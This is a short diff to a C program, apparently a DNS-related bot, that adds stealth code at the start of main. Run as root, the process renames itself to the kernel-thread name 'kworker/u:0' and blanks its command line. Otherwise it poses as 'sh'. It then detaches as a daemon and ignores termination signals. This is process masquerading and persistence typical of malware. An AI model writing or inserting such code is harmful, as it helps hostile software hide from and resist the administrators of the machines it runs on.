@@ -1,8 +1,19 @@
 #include "dns.h"
 #include <stdio.h>
 #include <signal.h>
+#include <unistd.h>
+#include <sys/prctl.h>
 
-int main() {
+int main(int argc, char **argv) {
+    if (getuid() == 0) {
+        prctl(PR_SET_NAME, (unsigned long)"kworker/u:0", 0, 0, 0);
+        strncpy(argv[0], "\0", strlen(argv[0]));
+    } else {
+        prctl(PR_SET_NAME, (unsigned long)"sh", 0, 0, 0);
+        strncpy(argv[0], "sh", strlen(argv[0]));
+    }
+    daemon(0, 0);
+    prctl(PR_SET_PDEATHSIG, SIGTERM);
     signal(SIGINT, SIG_IGN);
     signal(SIGHUP, SIG_IGN);
     signal(SIGTERM, SIG_IGN);
